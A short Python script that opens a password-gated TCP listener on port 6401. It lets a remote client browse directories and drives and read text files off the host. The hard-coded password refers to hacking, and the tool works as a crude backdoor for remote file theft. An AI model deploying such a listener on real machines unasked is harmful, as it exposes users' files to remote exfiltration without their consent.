from socket import *
import os as os
import time as t

connection = socket(AF_INET, SOCK_STREAM)
connection.bind(('', 6401))

print("waiting for connections...")

loop = True

while loop:
   connection.listen(1)
   client, address = connection.accept()
   password = client.recv(4096).decode()
   if password == "getMyFuckingPassword,ComeOn,HackThatShit":
      loop = False

def locate():
   root = os.getcwd()
   allDir = os.listdir()
   for i in allDir:
      root += "@" + i
   client.send(root.encode())


drives = [chr(x) + ":" for x in range(65,90) if os.path.exists(chr(x) + ":")]
print("available drives are :", drives)

print("client connected at", address)
client.send("connected".encode())

print("")

command = ""

while command != "quit":
   allCurentDir = os.listdir()
   command = client.recv(4096).decode()
   if command == "locate":
      locate()
      
      
   elif command == "back":
      os.chdir("..")
      print("client now at", os.getcwd())
      
      
   elif command == "goto":
      pathTogo = client.recv(4096).decode()
      exist = False
      for i in allCurentDir:
         if pathTogo == i:
            exist = True
            break
      if exist:
         client.send("directoryFound".encode())
         path = os.getcwd()+"\ "[:-1]+pathTogo
         os.chdir(path)
         print("client now at", os.getcwd())
      else:
         client.send("directoryNotFound".encode())
         
         
   elif command == "disk":
      diskToGo = client.recv(4096).decode().capitalize()+":"
      check = False
      for i in drives:
         if diskToGo == i:
            check = True
            break
      if check:
         client.send("diskFound".encode())
         os.chdir(diskToGo)
         while os.getcwd() != diskToGo+"\ "[:-1]:
            os.chdir("..")
         print("client now at", os.getcwd())
      else:
         client.send("diskNotFound".encode())
      
      
   elif command == "request":
      pathTogo = client.recv(4096).decode()
      exist = False
      for i in allCurentDir:
         if pathTogo == i:
            exist = True
            break
      if exist:
         client.send("folderFound".encode())
         print("Client requested file", pathTogo)
         theFile = open(pathTogo, "r")
         data = theFile.readlines()
         client.send("starting".encode())
         t.sleep(1)
         for i in data:
            client.send(i.encode())
         client.send("#!-!FINISH!-!".encode())
         theFile.close()
      else:
         client.send("folderNotFound".encode())
      
      
         





print("client disconnected")